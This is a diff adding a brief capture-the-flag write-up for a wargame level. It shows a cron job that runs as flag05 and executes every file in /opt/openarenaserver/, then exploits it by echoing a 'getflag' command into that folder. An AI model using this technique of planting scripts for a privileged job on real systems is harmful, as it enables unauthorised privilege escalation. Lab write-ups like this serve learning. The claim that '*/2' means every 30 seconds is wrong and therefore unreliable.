@@ -1,0 +1,26 @@
+Upon logging in the vm, we can see a message "You have new mail".
+
+Further research tells us to check /var/mail where we find a file named level05 containing :
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+This output refers to a crontab task running /usr/sbin/openarenaserver every 30 seconds under the flag05 account.
+
+/usr/sbin/openarenaserver contains :
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+This script runs any file present in the opt/openarenaserver/ folder and then deletes it.
+
+The solution is then to create a file in /opt/openarenaserver/. containing :
+
+getflag > /tmp/getflag
+
+by doing :
+
+echo "getflag > /tmp/getflag" > /opt/openarenaserver/getflag
